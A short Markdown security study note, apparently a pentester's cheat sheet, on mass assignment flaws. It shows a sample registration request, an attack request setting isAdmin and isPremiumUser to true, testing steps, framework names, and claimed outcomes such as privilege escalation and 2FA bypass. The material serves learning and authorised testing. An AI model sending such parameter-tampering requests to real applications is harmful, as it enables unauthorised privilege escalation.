# TOPIC
MASS ASSIGNMENT

# OVERVIEW
If a request is sent with a particular parameter only, and if the response contains more parameter that are set as
default, then we can pass these parameters in the response in the request itself, and try to change the
defautl values.

# UNDERSTANDING

## REQUEST
```
POST /register HTTP1.1
.
email=xyz@gmail.com
```

## RESPONSE
```
200 OK
.
email=xyz@gmail.com&isAdmin=false&isPremiumUser=false
```

We can include the isAdmin and isPremiumUser in the request itself and assign values "true" to them.

## REQUEST ATTACK
```
POST /register HTTP1.1
.  
email=xyz@gmail.com&isAdmin=true&isPremiumUser=true
```

## VULNERABLE APP RESPONSE

```
200 OK
.
email=xyz@gmail.com&isAdmin=true&isPremiumUser=true
```

# TESTING
There are different frameworks to test, and they are called so with different names on different frameworks.

## FRAMEWORKS :
MASS ASSIGNMENT => RUBY ON RAILS, NODE JS
AUTO BINDING => SPRING MVC, ASP NET MVC
OBJECT INJECTION => PHP


# HOW TO TEST
Capture the response for the normal request
Include the parameters present in the response to the request.
Observer for changed values
Navigate to the application to see the changed values.

# ACHIEVEMENTS
- By adding "Success : true" we can bypass 2FA
- Privelege Escalation
- Modifying / Overwriting sensitive information

# REFERENCES
https://cheatsheetseries.owasp.org/cheatsheets/Mass_Assignment_Cheat_Sheet.html
https://virtuesecurity.com/kb/api-mass-assignment/
https://itzone.com.vn/en/article/mass-assignment-vulnerability-and-prevention/

# REPORTS
https://hackerone.com/reports/99424
